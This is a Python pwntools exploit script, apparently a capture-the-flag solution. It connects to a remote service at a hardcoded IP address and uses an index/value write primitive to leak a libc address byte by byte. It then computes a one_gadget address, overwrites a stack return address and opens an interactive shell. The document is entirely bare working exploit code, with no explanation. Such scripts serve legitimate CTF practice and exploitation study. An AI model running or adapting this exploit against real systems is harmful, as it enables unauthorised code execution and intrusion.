from pwn import *

#context.log_level = 'debug'
#sh=process('./pwn')
sh=remote('39.106.224.151','60007')#('1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com','57856')#('111.198.29.45','32440')
elf = ELF('./pwn')
sh.sendlineafter('name:','name')

leak = ''
def scan(idx):
	global leak
	sh.sendlineafter('index\n',str(idx))
	sh.recvuntil('(hex) ')
	r = sh.recvuntil('\n',drop=True)[-2:]
	print r
	leak =r+leak
	l=int(r,16)
	sh.sendlineafter('value\n',str(l))

for i in range(632,638):
	scan(i)
leak=leak.ljust(8,'\x00')
print leak
leak_addr = int('0x'+leak,16)
print hex(leak_addr)

libc_start = leak_addr -240 
print 'libc_start_main:' + hex(libc_start)
libc = leak_addr-elf.plt['__libc_start_main']-0x1ff20
print hex(libc)
#system = libc+ 0x045390
#binsh = libc + 0x18cd57
one = 0x4526a + libc
print 'one: '+ hex(one)


ls = [0,0,0,0,0,0,0,0]
for i in range(0,8):
	ls[i] = one%0x100
	print hex(ls[i])
	one /= 0x100


for i in range(344,352):	
	j=i-344
	print hex(ls[j])
	sh.sendlineafter('index\n',str(i))
	sh.sendlineafter('value\n',str(ls[j]))	
#	sleep(2)
	
#gdb.attach(sh,'b* 0xc2a'+str(libc))
sh.sendlineafter('index\n',str(-1))
sh.sendlineafter('value\n',str(1))
sh.sendlineafter('? \n','no')
		
#gdb.attach(sh)
sh.interactive()
